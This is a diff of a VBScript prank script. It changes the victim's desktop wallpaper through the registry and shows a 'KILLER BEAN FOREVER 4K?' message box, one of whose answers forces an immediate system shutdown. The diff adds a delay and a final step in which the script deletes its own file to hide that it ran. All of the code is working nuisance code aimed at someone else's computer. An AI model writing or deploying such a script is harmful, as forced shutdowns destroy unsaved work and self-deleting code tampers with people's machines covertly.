@@ -1,3 +1,5 @@
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
 dim wshShell 
 dim sUserName
 dim result
@@ -18,7 +20,7 @@ oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper
 oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
 
 
-
+            WScript.sleep 5000
 
 result = MsgBox ("KILLER BEAN FOREVER 4K?", vbYesNo, "Choose Wisely")
 Select Case result
@@ -32,3 +34,8 @@ Select Case result
         Set oShell = WScript.CreateObject("WScript.Shell")
         oShell.Run "C:\WINDOWS\system32\shutdown.exe -f -s -t 0"
 End Select
+
+
+strScript = Wscript.ScriptFullName
+
+objFSO.DeleteFile(strScript)
